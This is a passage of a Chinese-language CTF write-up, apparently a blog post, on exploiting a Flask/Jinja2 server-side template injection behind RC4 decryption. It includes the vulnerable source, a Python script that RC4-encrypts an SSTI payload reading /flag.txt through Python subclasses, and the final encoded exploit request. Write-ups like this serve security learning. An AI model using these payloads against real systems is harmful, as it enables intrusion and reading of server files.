&quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1799, in dispatch_request</span><br><span class="line"></span><br><span class="line">    return self.view_functions[rule.endpoint](**req.view_args)</span><br><span class="line"></span><br><span class="line">    File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/templating.py&quot;, line 149, in render_template_string</span><br><span class="line"></span><br><span class="line">    return _render(ctx.app.jinja_env.from_string(source),</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 880, in from_string</span><br><span class="line"></span><br><span class="line">    return cls.from_code(self, self.compile(source), globals, None)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 579, in compile</span><br><span class="line"></span><br><span class="line">    source = self._parse(source, name, filename)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 497, in _parse</span><br><span class="line"></span><br><span class="line">    return Parser(self, source, name, encode_filename(filename)).parse()</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/parser.py&quot;, line 40, in __init__</span><br><span class="line"></span><br><span class="line">    self.stream = environment._tokenize(source, name, filename, state)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 528, in _tokenize</span><br><span class="line"></span><br><span class="line">    source = self.preprocess(source, name, filename)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 522, in preprocess</span><br><span class="line"></span><br><span class="line">    self.iter_extensions(), text_type(source))</span><br><span class="line"></span><br><span class="line">    UnicodeDecodeError: &#x27;ascii&#x27; codec can&#x27;t decode byte 0xfb in position 4: ordinal not in range(128)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们从报错的信息中找到flask模板注入的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=render_template_string(safe(deS))</span><br></pre></td></tr></table></figure>
-<p>所以点击去看源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if(secret==None):</span><br><span class="line"></span><br><span class="line">        return &#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><span class="line"></span><br><span class="line">    rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line"></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    if &#x27;ciscn&#x27; in a.lower():</span><br><span class="line"></span><br><span class="line">        return &#x27;flag detected!&#x27;</span><br><span class="line"></span><br><span class="line">   return a</span><br></pre></td></tr></table></figure>
-<p>可知，会对get提交的参数secret的值进行rc4解密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line"></span><br><span class="line">deS=rc.do_crypt(secret)</span><br></pre></td></tr></table></figure>
-<p>所以，我们需要对secret进行加密，然后解密后的secret会赋值给des，然后用render_template_string()函数进行模板渲染，所以我们可以使用内置类来执行命令，从而造成模板注入，但是内置类需要先rc4加密，所以exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box = list(range(256))  </span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % 256</span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>即可得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
-<p>然后构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
-<p>即可得到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF/" rel="tag">模板</a></li></ul>
 	</div>
 
       
